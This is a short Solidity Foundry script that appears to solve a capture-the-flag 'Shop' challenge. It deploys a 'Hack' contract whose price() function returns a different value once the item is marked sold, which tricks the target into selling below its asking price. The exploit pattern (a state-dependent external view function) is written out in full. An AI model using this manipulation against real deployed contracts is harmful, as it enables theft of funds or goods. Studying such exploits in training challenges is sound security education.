// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Shop} from "../src/Shop.sol";

contract ShopSolution is Script {
    address target = 0xA6b1DEaFdD70257ea10011050a96Ef330d38bD30;

    function run() external {
        vm.startBroadcast();
        Hack hack = new Hack(target);
        hack.buy();
        vm.stopBroadcast();
    }
}

contract Hack {
    Shop private immutable target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function buy() public {
        target.buy();
    }

    function price() public view returns (uint256) {
        if (target.isSold()) {
            return 99;
        }
        return 100;
    }
}
